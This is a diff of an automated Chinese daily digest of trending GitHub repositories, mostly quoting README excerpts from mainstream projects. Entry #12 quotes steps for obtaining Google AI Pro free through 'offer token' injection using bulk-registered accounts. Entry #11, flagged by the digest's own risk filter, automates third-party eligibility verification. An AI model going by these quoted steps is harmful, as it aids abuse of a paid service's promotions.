@@ -1,454 +1,809 @@
-📊 开源日报 — 2026-11-06
-共发现 12 个新项目（已自动过滤历史记录）
+📊 开源日报 — 2026-11-07
+共发现 17 个新项目（已自动过滤历史记录）
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#1  vercel-labs/agent-browser
-    ⭐ 46113 stars  |  🍴 3157 forks  |  💻 Rust  |  📅 2026-01-11
-    🔗 https://github.com/vercel-labs/agent-browser
+#1  react/react
+    ⭐ 252307 stars  |  🍴 51831 forks  |  💻 JavaScript  |  📅 2013-05-24
+    🔗 https://github.com/react/react
     📡 来源: trending-daily
-    📝 Browser automation CLI for AI agents
+    🏷️ declarative, frontend, javascript, library, react, ui
+    📝 The library for web and native user interfaces.
 
     README 摘要:
-    # agent-browser
+    # React &middot;     
     
-    Browser automation for AI agents: open pages, read them as an accessibility tree, and act on elements from the shell.
+    React is a JavaScript library for building user interfaces.
     
-      
-      
-      
-      
-      
+    * **Declarative:** React makes it painless to create interactive UIs. Design simple views for each state in your application, and React will efficiently update and render just the right components when your data changes. Declarative views make your code more predictable, simpler to understand, and easier to debug.
+    * **Component-Based:** Build encapsulated components that manage their own state, then compose them to make complex UIs. Since component logic is written in JavaScript instead of templates, you can easily pass rich data through your app and keep the state out of the DOM.
+    * **Learn Once, Write Anywhere:** We don't make assumptions about the rest of your technology stack, so you can develop new features in React without rewriting existing code. React can also render on the server using Node and power mobile apps using React Native.
     
-    agent-browser is a native Rust CLI that gives an AI agent a browser it can drive one command at a time. `snapshot` returns the page as compact text with a ref such as `@e1` for each element. The agent acts on a ref, reads the page again to check the result, and repeats. The browser stays open between commands, so each step is one short shell call.
+    Learn how to use React in your project.
     
-    ## Install
+    ## Installation
     
-    ```bash
-    npm install -g agent-browser
-    agent-browser install           # download Chrome for Testing (first time only)
-    ```
+    React has been designed for gradual adoption from the start, and **you can use as little or as much React as you need**:
     
-    - **Homebrew:** `brew install agent-browser`, then `agent-browser install`.
-    - **Linux:** `agent-browser install --with-deps` also installs the browser's system libraries.
-    - **No install:** `npx agent-browser open example.com`.
+    * Use Quick Start to get a taste of React.
+    * Add React to an Existing Project to use as little or as much React as you need.
+    * Create a New React App if you're looking for a powerful JavaScript toolchain.
     
-    Project installs, building from source, `upgrade`, and `doctor` are covered in Installation.
+    ## Documentation
     
-    ## Quick start
+    You can find the React documentation on the website.
     
-    ```bash
-    agent-browser open example.com
-    agent-browser snapshot -i       # interactive elements, each with a ref
-    agent-browser click @e1         # act on a ref from that snapshot
-    agent-browser get url           # check the result
-    agent-browser close
-    ```
+    Check out the Getting Started page for a quick overview.
     
-    The snapshot for `example.com`:
+    The documentation is divided into several sections:
     
-    ```
-    - link "Learn more" [ref=e1]
-    ```
+    * Quick Start
+    * Tutorial
+    * Thinking in React
+    * Installation
+    * Describing the UI
+    * Adding Interactivity
+    * Managing State
+    * Advanced Guides
+    * API Reference
+    * Where to Get Support
+    * Contributing Guide
+    
+    You can improve it by sending pull requests to this repository.
+    
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#2  lz4/lz4
-    ⭐ 12474 stars  |  🍴 1640 forks  |  💻 C  |  📅 2014-03-25
-    🔗 https://github.com/lz4/lz4
+#2  zed-industries/zed
+    ⭐ 93833 stars  |  🍴 11512 forks  |  💻 Rust  |  📅 2021-02-20
+    🔗 https://github.com/zed-industries/zed
     📡 来源: trending-daily
-    🏷️ c, compression, lz4
-    📝 Extremely Fast Compression algorithm
+    🏷️ gpui, rust-lang, text-editor, zed
+    📝 Code at the speed of thought – Zed is a high-performance, multiplayer code editor from the creators of Atom and Tree-sitter.
 
     README 摘要:
-    LZ4 - Extremely fast compression
-    ================================
+    # Zed
     
-    LZ4 is a lossless compression algorithm,
-    providing compression speed > 500 MB/s per core,
-    scalable with multi-core CPUs.
-    It features an extremely fast decoder,
-    with speed in multiple GB/s per core,
-    typically reaching RAM speed limits on multi-core systems.
-    
-    Compression speed can be tuned dynamically, by selecting an "acceleration" factor
-    which trades compression ratio for faster speed.
-    On the other end, a high compression derivative, LZ4_HC, is also provided,
-    trading CPU time for improved compression ratio.
-    All versions feature the same decompression speed.
-    
-    LZ4 is also compatible with dictionary compression,
-    both at API and CLI (`-D`) levels.
-    It can ingest any input file as dictionary, though only the final 64 KB are used.
-    This capability can be combined with the Zstandard Dictionary Builder,
-    in order to drastically improve compression performance on small files.
-    
-    The LZ4 library is provided as open-source software using the BSD 2-Clause license.
-    The `lz4` command line utility is provided under the GPL-2.0-or-later license.
-    
-    Benchmarks
-    -------------------------
-    
-    The benchmark uses [lzbench] v2.4.1, from @inikep
-    compiled with GCC v13.3.0 on Linux 64-bits (Ubuntu 24.04).
-    The reference system uses a Core i7-9700K CPU.
-    Benchmark evaluates the compression of reference [Silesia Corpus]
-    in single-thread mode.
-    
-    [lzbench]: https://github.com/inikep/lzbench
-    [Silesia Corpus]: https://sun.aei.polsl.pl/~sdeor/index.php?page=silesia
-    
-    |  Compressor             | Factor  | Compression | Decompression |
-    |  ----------             | -----   | ----------- | ------------- |
-    |  memcpy                 |  1.000  | 13700 MB/s  |  13700 MB/s   |
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#3  andrew-babo/muse4ai
-    ⭐ 872 stars  |  🍴 190 forks  |  💻 TypeScript  |  📅 2026-11-03
-    🔗 https://github.com/andrew-babo/muse4ai
-    📡 来源: 🚀 5天300+星
-    📝 Muse4AI — let your AI agent make the pictures and the videos. Local Windows bridge for Muse via REST, MCP, and OAuth.
-
-    README 摘要:
-    # Muse4AI
-    
-    **Let your AI agent make the pictures and the videos.**
-    
-    Muse4AI runs on your own Windows PC and hands your Muse session to ChatGPT, Claude,
-    Cursor, Codex, n8n or anything else that speaks **REST**, **MCP** or **OAuth** —
-    with no cloud middleman and no per-seat fee.
-    
-    **Website** ·
-    **Download** ·
-    **Guide** ·
-    **For agents** ·
-    Tiếng Việt
+    Welcome to Zed, a high-performance, multiplayer code editor from the creators of Atom and Tree-sitter.
     
     ---
     
-    ## How it fits together
+    ### Installation
+    
+    On macOS, Linux, and Windows you can download Zed directly or install Zed via your local package manager (macOS/Linux/Windows).
+    
+    Other platforms are not yet available:
+    
+    - Web (tracking discussion)
+    
+    ### Developing Zed
+    
+    - Building Zed for macOS
+    - Building Zed for Linux
+    - Building Zed for Windows
+    
+    ### Contributing
+    
+    See CONTRIBUTING.md for ways you can contribute to Zed.
+    
+    Also... we're hiring! Check out our jobs page for open roles.
+    
+    ### Licensing
+    
+    Zed source code is licensed primarily under GPL-3.0-or-later, with Apache-2.0 components where marked.
+    
+    License information for third party dependencies must be correctly provided for CI to pass.
+    
+    We use `cargo-about` to automatically comply with open source licenses. If CI is failing, check the following:
+    
+    - Is it showing a `no license specified` error for a crate you've created? If so, add `publish = false` under `[package]` in your crate's Cargo.toml.
+    - Is the error `failed to satisfy license requirements` for a dependency? If so, first determine what license the project has and whether this system is sufficient to comply with this license's requirements. If you're unsure, ask a lawyer. Once you've verified that this system is acceptable add the license's SPDX identifier to the `accepted` array in `script/licenses/zed-licenses.toml`.
+    - Is `cargo-about` unable to find the license for a dependency? If so, add a clarification field at the end of `script/licenses/zed-licenses.toml`, as specified in the cargo-about book.
+    
+    ## Sponsorship
+    
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#3  prometheus/prometheus
+    ⭐ 67241 stars  |  🍴 10991 forks  |  💻 Go  |  📅 2012-11-24
+    🔗 https://github.com/prometheus/prometheus
+    📡 来源: trending-daily
+    🏷️ alerting, graphing, hacktoberfest, metrics, monitoring, prometheus, time-series
+    📝 The Prometheus monitoring system and time series database.
+
+    README 摘要:
+    Prometheus
+    
+    Visit prometheus.io for the full documentation,
+    examples and guides.
+    
+    [][quay]
+    [][hub]
+    
+    Prometheus, a Cloud Native Computing Foundation project, is a systems and service monitoring system. It collects metrics
+    from configured targets at given intervals, evaluates rule expressions,
+    displays the results, and can trigger alerts when specified conditions are observed.
+    
+    The features that distinguish Prometheus from other metrics and monitoring systems are:
+    
+    * A **multi-dimensional** data model (time series defined by metric name and set of key/value dimensions)
+    * PromQL, a **powerful and flexible query language** to leverage this dimensionality
+    * No dependency on distributed storage; **single server nodes are autonomous**
+    * An HTTP **pull model** for time series collection
+    * **Pushing time series** is supported via an intermediary gateway for batch jobs
+    * Targets are discovered via **service discovery** or **static configuration**
+    * Multiple modes of **graphing and dashboarding support**
+    * Support for hierarchical and horizontal **federation**
+    
+    ## Architecture overview
+    
+    ## Install
+    
+    There are various ways to install Prometheus.
+    
+    ### Precompiled binaries
+    
+    Precompiled binaries for released versions are available in the
+    *download* section
+    on prometheus.io. Using the latest production release binary
+    is the recommended way to install Prometheus.
+    See the Installing
+    chapter in the documentation for all the details.
+    
+    ### Docker images
+    
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#4  rails/rails
+    ⭐ 59058 stars  |  🍴 23833 forks  |  💻 Ruby  |  📅 2008-04-11
+    🔗 https://github.com/rails/rails
+    📡 来源: trending-daily
+    🏷️ activejob, activerecord, framework, html, mvc, rails, ruby
+    📝 Ruby on Rails
+
+    README 摘要:
+    # Welcome to Rails
+    
+    ## What's Rails?
+    
+    Rails is a web application framework that includes everything needed to
+    create database-backed web applications according to the
+    Model-View-Controller (MVC)
+    pattern.
+    
+    Understanding the MVC pattern is key to understanding Rails. MVC divides your
+    application into three layers: Model, View, and Controller, each with a specific responsibility.
+    
+    ## Model layer
+    
+    The _**Model layer**_ represents the domain model (such as Account, Product,
+    Person, Post, etc.) and encapsulates the business logic specific to
+    your application. In Rails, database-backed model classes are derived from
+    `ActiveRecord::Base`. Active Record allows you to present the data from
+    database rows as objects and embellish these data objects with business logic
+    methods.
+    Although most Rails models are backed by a database, models can also be ordinary
+    Ruby classes, or Ruby classes that implement a set of interfaces as provided by
+    the Active Model module.
+    
+    ## View layer
+    
+    The _**View layer**_ is composed of "templates" that are responsible for providing
+    appropriate representations of your application's resources. Templates can
+    come in a variety of formats, but most view templates are HTML with embedded
+    Ruby code (ERB files). Views are typically rendered to generate a controller response
+    or to generate the body of an email. In Rails, View generation is handled by Action View.
+    
+    ## Controller layer
+    
+    The _**Controller layer**_ is responsible for handling incoming HTTP requests and
+    providing a suitable response. Usually, this means returning HTML, but Rails controllers
+    can also generate XML, JSON, PDFs, mobile-specific views, and more. Controllers load and
+    manipulate models, and render view templates in order to generate the appropriate HTTP response.
+    In Rails, incoming requests are routed by Action Dispatch to an appropriate controller, and
+    controller classes are derived from `ActionController::Base`. Action Dispatch and Action Controller
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#5  etcd-io/etcd
+    ⭐ 52643 stars  |  🍴 10590 forks  |  💻 Go  |  📅 2013-07-06
+    🔗 https://github.com/etcd-io/etcd
+    📡 来源: trending-daily
+    🏷️ cncf, consensus, database, distributed-database, distributed-systems, etcd, go, key-value, kubernetes, raft
+    📝 Distributed reliable key-value store for the most critical data of a distributed system
+
+    README 摘要:
+    # etcd
+    
+    **Note**: The `main` branch may be in an *unstable or even broken state* during development. For stable versions, see [releases][github-release].
+    
+      
+      
+      
+    
+    etcd is a distributed reliable key-value store for the most critical data of a distributed system, with a focus on being:
+    
+    * *Simple*: well-defined, user-facing API (gRPC)
+    * *Secure*: automatic TLS with optional client cert authentication
+    * *Fast*: benchmarked 10,000 writes/sec
+    * *Reliable*: properly distributed using Raft
+    
+    etcd is written in Go and uses the [Raft][] consensus algorithm to manage a highly-available replicated log.
+    
+    etcd is used in production by many companies, and the development team stands behind it in critical deployment scenarios, where etcd is frequently teamed with applications such as [Kubernetes][k8s], [locksmith][], [vulcand][], [Doorman][], and many others. Reliability is further ensured by rigorous **robustness testing**.
+    
+    See [etcdctl][etcdctl] for a simple command line client.
+    
+    Original image credited to  xkcd.com/2347, alterations by Josh Berkus.
+    
+    [raft]: https://raft.github.io/
+    [k8s]: http://kubernetes.io/
+    [doorman]: https://github.com/youtube/doorman
+    [locksmith]: https://github.com/coreos/locksmith
+    [vulcand]: https://github.com/vulcand/vulcand
+    [etcdctl]: https://github.com/etcd-io/etcd/tree/main/etcdctl
+    
+    ## Documentation
+    
+    The most common API documentation you'll need can be found here:
+    
+    * go.etcd.io/etcd/api/v3
+    * go.etcd.io/etcd/client/pkg/v3
+    * go.etcd.io/etcd/client/v3
+    * go.etcd.io/etcd/etcdctl/v3
+    * go.etcd.io/etcd/pkg/v3
+    * go.etcd.io/etcd/raft/v3
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#6  astral-sh/ruff
+    ⭐ 50756 stars  |  🍴 2616 forks  |  💻 Rust  |  📅 2022-08-09
+    🔗 https://github.com/astral-sh/ruff
+    📡 来源: trending-daily
+    🏷️ linter, pep8, python, python3, ruff, rust, rustpython, static-analysis, static-code-analysis, style-guide
+    📝 An extremely fast Python linter and code formatter, written in Rust.
+
+    README 摘要:
+    # Ruff
+    
+    **Docs** | **Playground**
+    
+    An extremely fast Python linter and code formatter, written in Rust.
+    
+      
+        
+        
+        
+      
+    
+      Linting the CPython codebase from scratch.
+    
+    - ⚡️ 10-100x faster than existing linters (like Flake8) and formatters (like Black)
+    - 🐍 Installable via `pip`
+    - 🛠️ `pyproject.toml` support
+    - 🤝 Python 3.15 compatibility
+    - ⚖️ Drop-in parity with Flake8, isort, and Black
+    - 📦 Built-in caching, to avoid re-analyzing unchanged files
+    - 🔧 Fix support, for automatic error correction (e.g., automatically remove unused imports)
+    - 📏 Over 900 built-in rules, with native re-implementations
+        of popular Flake8 plugins, like flake8-bugbear
+    - ⌨️ First-party editor integrations for VS Code and more
+    - 🌎 Monorepo-friendly, with hierarchical and cascading configuration
+    
+    Ruff aims to be orders of magnitude faster than alternative tools while integrating more
+    functionality behind a single, common interface.
+    
+    Ruff can be used to replace Flake8 (plus dozens of plugins),
+    Black, isort,
+    pydocstyle, pyupgrade,
+    autoflake, and more, all while executing tens or hundreds of
+    times faster than any individual tool.
+    
+    Ruff is actively developed and used in major open-source projects like:
+    
+    - Apache Airflow
+    - Apache Superset
+    - FastAPI
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#7  nushell/nushell
+    ⭐ 41022 stars  |  🍴 2344 forks  |  💻 Rust  |  📅 2019-05-10
+    🔗 https://github.com/nushell/nushell
+    📡 来源: trending-daily
+    🏷️ nushell, rust, shell
+    📝 A new type of shell
+
+    README 摘要:
+    # Nushell 
+    
+    A new type of shell.
+    
+    ## Table of Contents 
+    
+    - Status
+    - Learning About Nu
+    - Installation
+    - Configuration
+    - Philosophy
+      - Pipelines
+      - Opening files
+      - Plugins
+    - Goals
+    - Officially Supported By
+    - Contributing
+    - License
+    
+    ## Status
+    
+    This project has reached a minimum-viable-product level of quality. Many people use it as their daily driver, but it may be unstable for some commands. Nu's design is subject to change as it matures.
+    
+    ## Learning About Nu
+    
+    The Nushell book is the primary source of Nushell documentation. You can find a full list of Nu commands in the book, and we have many examples of using Nu in our cookbook.
+    
+    We're also active on Discord; come and chat with us!
+    
+    ## Installation
+    
+    To quickly install Nu:
+    
+    ```bash
+    # Linux and macOS
+    brew install nushell
+    # Windows
+    winget install nushell
+    ```
+    
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#8  mpv-player/mpv
+    ⭐ 37936 stars  |  🍴 3635 forks  |  💻 C  |  📅 2012-10-13
+    🔗 https://github.com/mpv-player/mpv
+    📡 来源: trending-daily
+    🏷️ audio, c, ffmpeg, mplayer, mpv, multimedia, video
+    📝 🎥 Command line media player
+
+    README 摘要:
+    # mpv
+    
+    * External links
+    * Overview
+    * System requirements
+    * Downloads
+    * Changelog
+    * Compilation
+    * Release cycle
+    * Bug reports
+    * Contributing
+    * License
+    * Contact
+    
+    ## External links
+    
+    * Wiki
+    * User Scripts
+    * [FAQ][FAQ]
+    * Manual
+    
+    ## Overview
+    
+    **mpv** is a free (as in freedom) media player for the command line. It supports
+    a wide variety of media file formats, audio and video codecs, and subtitle types.
+    
+    There is a [FAQ][FAQ].
+    
+    Releases can be found on the [release list][releases].
+    
+    ## System requirements
+    
+    - A not too ancient Linux (usually, only the latest releases of distributions
+      are actively supported), Windows 10 1607 or later, or macOS 10.15 or later.
+    - A somewhat capable CPU. Hardware decoding might help if the CPU is too slow to
+      decode video in realtime, but must be explicitly enabled with the `--hwdec`
+      option.
+    - A not too crappy GPU. mpv's focus is not on power-efficient playback on
+      embedded or integrated GPUs (for example, hardware decoding is not even
+      enabled by default). Low power GPUs may cause issues like tearing, stutter,
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#9  symfony/symfony
+    ⭐ 31478 stars  |  🍴 9950 forks  |  💻 PHP  |  📅 2010-01-04
+    🔗 https://github.com/symfony/symfony
+    📡 来源: trending-daily
+    🏷️ bundle, framework, hacktoberfest, php, php-framework, symfony, symfony-bundle
+    📝 The Symfony PHP framework
+
+    README 摘要:
+    [Symfony][1] is a **PHP framework** for web and console applications and a set
+    of reusable **PHP components**. Symfony is used by thousands of web
+    applications and most of the [popular PHP projects][2].
+    
+    Installation
+    ------------
+    
+    * [Install Symfony][4] with Composer (see [requirements details][3]).
+    * Symfony follows the [semantic versioning][5] strictly, publishes "Long Term
+      Support" (LTS) versions and has a [release process][6] that is predictable and
+      business-friendly.
+    
+    Sponsor
+    -------
+    
+    Symfony 8.2 is looking for [backers][27].
+    
+    Help Symfony by [sponsoring][31] its development!
+    
+    Documentation
+    -------------
+    
+    * Read the [Getting Started guide][7] if you are new to Symfony.
+    * Try the [Symfony Demo application][23] to learn Symfony in practice.
+    * Discover Symfony ecosystem in detail with [Symfony The Fast Track][26].
+    * Master Symfony with the [Guides and Tutorials][8], the [Components docs][9]
+      and the [Best Practices][10] reference.
+    
+    Community
+    ---------
+    
+    * [Join the Symfony Community][11] and meet other members at the [Symfony events][12].
+    * [Get Symfony support][13] on GitHub Discussions, Slack, etc.
+    * Follow us on [GitHub][14], [Twitter][15] and [Facebook][16].
+    * Read our [Code of Conduct][24] and meet the [CARE Team][25].
+    
+    Contributing
+    ------------
+    
+    Symfony is an Open Source, community-driven project with thousands of
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#10  openssl/openssl
+    ⭐ 31333 stars  |  🍴 11583 forks  |  💻 C  |  📅 2013-01-15
+    🔗 https://github.com/openssl/openssl
+    📡 来源: trending-daily
+    🏷️ cryptography, decryption, encryption, openssl, ssl, tls
+    📝 General purpose TLS and crypto library
+
+    README 摘要:
+    Welcome to the OpenSSL Project
+    ==============================
+    
+    [![openssl logo]][www.openssl.org]
+    
+    [![github actions ci badge]][github actions ci]
+    
+    OpenSSL is a robust, commercial-grade, full-featured Open Source Toolkit
+    for the Transport Layer Security (TLS, formerly SSL), Datagram TLS (DTLS), and QUIC protocols.
+    
+    The protocol implementations are based on a full-strength general purpose
+    cryptographic library, which can also be used stand-alone. Also included is a
+    cryptographic module validated to conform with FIPS standards.
+    
+    OpenSSL is descended from the SSLeay library developed by Eric A. Young
+    and Tim J. Hudson.
+    
+    The official Home Page of the OpenSSL Project is [www.openssl.org].
+    
+    Table of Contents
+    =================
+    
+     - Overview
+     - Download
+     - Build and Install
+     - Documentation
+     - License
+     - Support
+     - Contributing
+     - Legalities
+    
+    Overview
+    ========
+    
+    The OpenSSL toolkit includes:
+    
+    - **libssl**
+      an implementation of all TLS protocol versions up to TLSv1.3 ([RFC 8446]),
+      DTLS protocol versions up to DTLSv1.3 ([RFC 9147]) and
+      the QUIC version 1 protocol ([RFC 9000]).
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#11  ⚠️风险  JenkinWoo/sheeridVerify
+    ⚠️ 命中风险词: 绕过, cookie —— 默认归排除区，需人工确认
+    ⭐ 1138 stars  |  🍴 602 forks  |  💻 JavaScript  |  📅 2026-11-06
+    🔗 https://github.com/JenkinWoo/sheeridVerify
+    📡 来源: 🚀 5天300+星
+    📝 无描述
+
+    README 摘要:
+    # sheeridVerify · 教学与研究验证流程工作台
+    
+      
+    
+    **sheeridVerify** 是一个基于 Node.js 的验证流程学习项目，提供本地 Web 工作台、任务队列、浏览器表单交互及 HTTP 状态查询，供学校教学、学术研究和获得授权的流程测试使用。
+    
+    > **用途说明：** 本项目仅以教学与研究为目的提供。使用真实平台前应取得必要授权，遵守适用法律和平台条款；不得伪造身份、学籍或材料，不得冒用信息、骗取权益或绕过资格审核。本项目与 SheerID 及任何学校均无官方隶属或认可关系，也不保证验证成功。详情见 用途说明与免责声明，代码许可见 ISC 协议。
+    
+    ## 文档导航
+    
+    - 快速开始
+    - 工作台与接口说明
+    - Linux / Instabox 部署、更新与排错
+    - 浏览器流程说明
+    - 贡献指南 · 安全说明 · 免责声明
+    
+    ## 功能
+    
+    - 通过 fetch 读取验证状态，按当前步骤选择浏览器或材料处理流程。
+    - 在 Web 页面创建、排队、停止、恢复和删除任务；失败任务删除后可重新提交。
+    - 按配置限制并发，记录任务进度，提交后默认每 5 秒查询结果。
+    - 上传原始 PNG、JPEG、PDF 文件，不生成或修改证明材料；交互式真人验证由用户完成。
+    - 使用访问密码、会话 Cookie、来源检查及写请求令牌保护工作台接口。
+    
+    ## 快速开始
+    
+    需要 **Node.js >= 22.15** 与 npm。从 GitHub 获取源码：
+    
+    ```bash
+    git clone https://github.com/JenkinWoo/sheeridVerify.git
+    cd sheeridVerify
+    ```
+    
+    使用下载的 ZIP 时，解压后进入其中包含 `package.json` 的目录。在项目根目录安装依赖与浏览器：
+    
+    ```bash
+    npm ci
+    npm run browser:install
+    ```
+    
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#12  mmdoctor/google-pro-helper
+    ⭐ 967 stars  |  🍴 371 forks  |  💻 Python  |  📅 2026-11-05
+    🔗 https://github.com/mmdoctor/google-pro-helper
+    📡 来源: 🚀 5天300+星
+    📝 无描述
+
+    README 摘要:
+    # Google Pro Helper
+    
+    本仓库收录两个独立版本：浏览器扩展版与批量版，分别保留各自的目录结构和原有代码。
+    
+    | 版本 | 目录 | 简介 |
+    | --- | --- | --- |
+    | 浏览器扩展版 | extension | 在浏览器中使用的扩展项目，包含扩展清单、弹窗页面、脚本与图标。 |
+    | 批量版 | batch | 用于批量账号任务管理的本地控制台项目，包含网页界面、后端、启动脚本与测试。 |
+    
+    ## 目录结构
     
     ```text
-       ChatGPT · Claude · Cursor · Codex · n8n · your own script
-                           │
-                           │  REST  ·  MCP  ·  OAuth
-                           ▼
-                  ┌─────────────────────┐
-                  │   Muse4AI on your PC│   local library, queue,
-                  │   (Windows app)     │   keys, tokens, history
-                  └─────────────────────┘
-                           │
-                           │  your own signed-in Muse session
-                           ▼
-                         Muse
+    google-pro-helper/
+    ├── extension/   # 浏览器扩展版
+    ├── batch/       # 批量版
+    ├── .gitignore
+    └── README.md
     ```
     
-    Nothing is relayed through a server we run. The app talks to Muse from your machine,
-    with your session, and keeps every result, key and token in
-    `%APPDATA%\MuseStudio` on that same machine.
+    ## 浏览器扩展版
     
-    ## What you can ask an agent to do
+    Linuxdo原帖在此:
     
-      
+    https://linux.do/t/topic/3123997
+    
+    （💰 免费激活 Google AI Pro 12 / 24 个月」| offer token 注入）
+    
+    （我本人大部分号是用的是注册机批量搞的，原理都一样，总共整了七个目前都活过了半个月，不过被这么大批量薅，估计也活不久了）
+    
+    > **在此提示，不要用大号！！！！**
+    
+    ### **1.在chrome浏览器上点击"加载未打包的拓展程序"，注意打开开发者模式**
+    
+    ### **2.然后打开 one.google.com/plans，按照拓展里步骤，先开12月的，注意正上方的绿色提示，和右下角的提示**
+    
+    ### **3.然后选择pro套餐，进行绑卡（需要卡里有至少1u验证，u卡基本都行，测试卡：starryblu/maya/bybit/mexc/招行master/中行2233master/bitEU/wise/savo卡全都可以）付款前一定要看清，第一个步骤首月必定是0元的**
+    
+    > PS：这里需要说明如果是已经给了折扣的情况，如下图，付款时有极大概率需要付款首月的youtube会员，小心别被反薅，正常显示的都是在下个月才收费
+    
+    ### **4.然后如果不再出订购页面的话，不要着急，也不要取消订阅（其实取消了也无所谓）。**
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#4  brightsongwrath/personal-data-deletor-osint
-    ⭐ 651 stars  |  🍴 113 forks  |  💻 JavaScript  |  📅 2026-11-03
-    🔗 https://github.com/brightsongwrath/personal-data-deletor-osint
+#13  Sandflow-ai/sand3d
+    ⭐ 859 stars  |  🍴 102 forks  |  💻 HTML  |  📅 2026-11-03
+    🔗 https://github.com/Sandflow-ai/sand3d
     📡 来源: 🚀 5天300+星
-    🏷️ ccpa, data-brokers, delete-me, opsec, opt-out, portable, privacy, windows
-    📝 Ask 970 data brokers to delete your data. Free, local, no account, no server.
+    🏷️ 3d, blender, cad, llm, procedural-modeling, python, usd
+    📝 3D modeling in Python, built for LLMs.
 
     README 摘要:
-    They sell your data. Make them stop.
+    &nbsp;sand3d
     
-    Unlisted asks data brokers to delete you, tracks every deadline and reads their replies.No subscription, no account, no server. It runs on your PC.
+    **3D modeling in Python, built for LLMs.**
     
-      Why Unlisted ·
-      What it does ·
-      Get it ·
-      AI ·
-      What it won't do ·
-      FAQ
+    sand3d is a Python library for writing 3D objects as short programs: profiles, solids,
+    edits, frames, joints and assemblies, over Blender's `bpy`. A program says *how* a shape
+    is made, part by part and in its own words, so a model writes it in a few hundred tokens
+    and a person can read it.
     
-      
-    
-    ## Why Unlisted
-    
-    Right now, sites you've never heard of list your name, address, phone number and relatives. Anyone can look you up, including a stalker or a scammer who needs one convincing detail.
-    
-    Companies will remove you for about **$96 to $129 a year**. Much of that work is sending requests you already have the legal right to send yourself, and in many places brokers have to honor them for free.
-    
-    **Over 500,000 Californians signed up for the state's free deletion tool in its first eight months.** People want this. The rest of the world just doesn't have a free button.
-    
-    So here's one.
-    
-    | | Paid removal services | Doing it by hand | Unlisted |
-    |---|---|---|---|
-    | **Price** | About $96 to $129 a year | Free | **Free** |
-    | **Your data** | On their servers | With you | **Encrypted on your drive** |
-    | **Sending requests** | Done for you | You, 900 times | **Done for you** |
-    | **Deadlines and replies** | Handled for you | A spreadsheet | **Tracked, and read by rules or AI** |
-    | **Web forms and CAPTCHAs** | Often done for you | You | **You, with your details ready to copy** |
-    | **Account needed** | Yes | No | **No** |
-    
-    Paid services do real work, especially on forms. If you'd rather pay to never think about it, they're a fair choice. Unlisted is for everyone else.
-    
-    ## What it does
+      &nbsp;Website ·
+      &nbsp;Docs ·
+      &nbsp;Datasets ·
+      &nbsp;Explorer
     
       
+      
+      
+      
     
-    The real app, recorded with a made-up person and a mail server on the same PC. No email left it.
+    ## Why sand3d
     
+    How it is measured, part by part
+    
+    - **Short.** A part takes 2 to 6× fewer tokens than the same part in Blender Python, CadQuery or FeatureScript (details).
+    - **The whole API fits in a prompt**, about 3,600 tokens (the API).
+    - **Named, not computed.** Parts, edges and faces are reached by name, never by hand-computed coordinates.
+    - **Deterministic.** The same program builds the same mesh, bit for bit.
+    
+    ## A whole object, part by part
+    
+    A front-loading washing machine in 38 lines of code (play it and read it):
+    the cabinet, the drum, the door with its glass and handle, the detergent drawer and the dial,
+    each a named part, and four joints that say how they move.
+    
+    ```python
+    door = s3d.group("door", ring, glass, handle)                      # the handle and the glass move with it
+    s3d.joint("door_hinge", door, hinge, axis="-Z", range=(0, 143))
+    s3d.joint("drum_spin", drum, front.move(0, 400), kind="continuous")
+    s3d.joint("drawer_slide", drawer, top_band.move(150), kind="prismatic", axis="+X", range=(0, 200))
+    s3d.joint("dial_turn", dial, top_band.move(-150), kind="continuous")
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#5  livliv-dev/player
-    ⭐ 620 stars  |  🍴 61 forks  |  💻 TypeScript  |  📅 2026-11-04
-    🔗 https://github.com/livliv-dev/player
+#14  sarpstar/cinecode
+    ⭐ 498 stars  |  🍴 82 forks  |  💻 Python  |  📅 2026-11-03
+    🔗 https://github.com/sarpstar/cinecode
     📡 来源: 🚀 5天300+星
-    🏷️ avatar, character, face-tracking, lip-sync, pngtuber, vrm, vtuber, webgl2
-    📝 A lightweight 2.5D character player for the web, with lip sync and webcam face tracking.
+    📝 Films made with code. Short films, long YouTube videos, ads, explainers and music videos: an AI coding agent writes the script, builds every frame in code, designs the sound and hands you an MP4.
 
     README 摘要:
-    A lightweight 2.5D character player for the web, with lip sync and webcam face tracking. A few lines of code put a character in a page, a stream overlay or an app.
-      Comes with 21 featured characters in different styles, ready to use.
+    Kodla yazılmış filmler.
+      Kısa filmler, uzun YouTube videoları, reklamlar, açıklayıcılar ve müzik videoları. Fikri ve zevki sen getirirsin; bir yapay zekâ kodlama ajanı senaryoyu yazar, her kareyi kodla kurar, sesi tasarlar ve sana bitmiş bir MP4 verir.
     
-    English · 中文 · 日本語
+      English ·
+      简体中文 ·
+      日本語 ·
+      Kurulum ·
+      Hızlı başlangıç ·
+      SSS
     
-    - WebGL2, no dependencies, about 30 KB gzipped for the core
